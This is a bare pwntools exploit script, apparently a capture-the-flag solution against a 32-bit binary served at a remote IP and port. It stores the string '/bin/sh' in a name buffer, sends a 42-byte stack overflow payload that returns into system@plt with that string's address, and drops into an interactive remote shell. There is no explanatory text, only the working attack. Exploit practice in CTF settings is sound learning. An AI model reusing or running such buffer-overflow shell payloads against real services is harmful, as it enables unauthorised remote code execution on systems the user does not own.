from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('111.198.29.45',35993)
elf = ELF('./pwn')
main = elf.sym['main']
system_plt = elf.sym['system']
binsh = 0x0804A080
p.sendlineafter("name\n",'/bin/sh\x00')
payload = 'A'*42 + p32(system_plt) + p32(main) + p32(binsh)
p.sendlineafter('here:\n',payload)
sleep(1)
p.interactive()
